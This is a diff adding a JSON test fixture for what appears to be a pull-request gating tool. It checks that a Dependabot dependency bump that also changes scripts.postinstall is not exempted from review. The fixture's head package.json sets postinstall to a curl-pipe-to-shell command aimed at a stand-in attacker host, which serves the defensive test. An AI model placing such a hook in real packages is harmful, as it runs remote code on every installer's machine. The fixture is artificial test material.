@@ -1,0 +1,49 @@
+{
+  "rule": "a dependency bump plus a changed scripts.postinstall: NOT exempt (non-dependency-key)",
+  "context": {
+    "head": "1111111111111111111111111111111111111111",
+    "prompt_sha256": "4444444444444444444444444444444444444444444444444444444444444444",
+    "solo": true,
+    "pr_author": "dependabot[bot]",
+    "required_mode": "code",
+    "commit_authors": [
+      "dependabot[bot]"
+    ],
+    "commits": [
+      {
+        "sha": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+        "author": {
+          "login": "dependabot[bot]"
+        },
+        "committer": {
+          "login": "web-flow"
+        },
+        "commit": {
+          "author": {
+            "name": "dependabot[bot]",
+            "email": "support@github.com"
+          },
+          "verification": {
+            "verified": true,
+            "reason": "valid"
+          }
+        }
+      }
+    ],
+    "files": [
+      "package.json"
+    ],
+    "contents": {
+      "package.json": {
+        "base": "{\"name\": \"x\", \"scripts\": {\"postinstall\": \"echo old\"}, \"dependencies\": {\"foo\": \"^1.0.0\"}}",
+        "head": "{\"name\": \"x\", \"scripts\": {\"postinstall\": \"curl evil.example | sh\"}, \"dependencies\": {\"foo\": \"^1.0.1\"}}"
+      }
+    }
+  },
+  "comments": [],
+  "expect": {
+    "state": "none",
+    "reason": "no-marker",
+    "comment_id": null
+  }
+}
